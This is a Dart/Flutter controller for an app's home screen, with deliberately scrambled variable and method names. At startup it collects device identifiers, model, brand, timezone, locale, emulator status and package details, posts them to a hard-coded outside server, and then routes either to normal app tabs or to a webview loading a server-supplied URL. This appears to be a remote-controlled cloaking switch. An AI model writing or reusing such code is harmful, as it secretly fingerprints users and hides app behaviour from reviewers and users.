import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:internet_connection_checker/internet_connection_checker.dart';



class FreqHomeLogic extends GetxController {

  var izgalxkc = RxBool(false);
  var xupagnhvq = RxBool(true);
  var lysjow = RxString("");
  var vickie = RxBool(false);
  var champlin = RxBool(true);
  final tuwibah = Dio();


  InAppWebViewController? webViewController;

  dynamic osidvpjg(){
    final lqferxvs = InternetConnectionChecker.instance;
    final psfmyqenwb = lqferxvs.onStatusChange.skip(1).listen(
          (InternetConnectionStatus nxvopt) {
        if (nxvopt == InternetConnectionStatus.connected) {
          suqicb();
        } else {
          Get.toNamed('/freq_wrong')?.then((_){
            suqicb();
          });
        }
      },
    );
    return psfmyqenwb;
  }

  Future<bool> fvatwxs() async {
    var todqmuiar = await InternetConnectionChecker.instance.hasConnection;
    if(!todqmuiar){
      Get.toNamed('/freq_wrong')?.then((_){
        suqicb();
      });
    }
    return todqmuiar;
  }

  @override
  void onInit() {
    super.onInit();
    osidvpjg();
    suqicb();
  }


  Future<void> suqicb() async {

    var uqvfzgrn = await fvatwxs();
    if(!uqvfzgrn){
      return;
    }

    vickie.value = true;
    champlin.value = true;
    xupagnhvq.value = false;

    tuwibah.post("https://mv.cbackit.com/exjuqfvlygistko",data: await kdbzuqgl()).then((value) {
      var xysalcop = value.data["xysalcop"] as String;
      var sdwbtxml = value.data["sdwbtxml"] as bool;
      if (sdwbtxml) {
        lysjow.value = xysalcop;
        gino();
      } else {
        wyman();
      }
    }).catchError((e) {
      xupagnhvq.value = true;
      champlin.value = true;
      vickie.value = false;
    });
  }

  Future<Map<String, dynamic>> kdbzuqgl() async {
    final DeviceInfoPlugin yrhtis = DeviceInfoPlugin();
    PackageInfo qrexg_jemsl = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var urckbmd = Platform.localeName;
    var crlq = currentTimeZone;

    var exrgtp = qrexg_jemsl.packageName;
    var amdli = qrexg_jemsl.version;
    var ferxyh = qrexg_jemsl.buildNumber;

    var fudqew = qrexg_jemsl.appName;
    var qwhpvoc = "";
    var lypcrqsi  = "";
    var hcbym = "";
    var orlandoJohnson = "";
    var meghanLockman = "";
    var tiaRoberts = "";
    var arianeBode = "";


    var hxrwmva = "";
    var bkflqte = false;

    if (GetPlatform.isAndroid) {
      hxrwmva = "android";
      var ynlsotb = await yrhtis.androidInfo;

      hcbym = ynlsotb.brand;

      qwhpvoc  = ynlsotb.model;
      lypcrqsi = ynlsotb.id;

      bkflqte = ynlsotb.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      hxrwmva = "ios";
      var xjmpsovuni = await yrhtis.iosInfo;
      hcbym = xjmpsovuni.name;
      qwhpvoc = xjmpsovuni.model;

      lypcrqsi = xjmpsovuni.identifierForVendor ?? "";
      bkflqte  = xjmpsovuni.isPhysicalDevice;
    }
    var res = {
      "ferxyh": ferxyh,
      "bkflqte": bkflqte,
      "amdli": amdli,
      "qwhpvoc": qwhpvoc,
      "crlq": crlq,
      "meghanLockman" : meghanLockman,
      "hcbym": hcbym,
      "lypcrqsi": lypcrqsi,
      "urckbmd": urckbmd,
      "hxrwmva": hxrwmva,
      "orlandoJohnson" : orlandoJohnson,
      "exrgtp": exrgtp,
      "tiaRoberts" : tiaRoberts,
      "fudqew": fudqew,
      "arianeBode" : arianeBode,

    };
    return res;
  }

  Future<void> wyman() async {
    Get.offNamed("/freq_tab");
  }

  Future<void> gino() async {
    Get.offNamed("/freq_speed");
  }

  @override
  void dispose() {
    osidvpjg().cancel();
    super.dispose();
  }

}
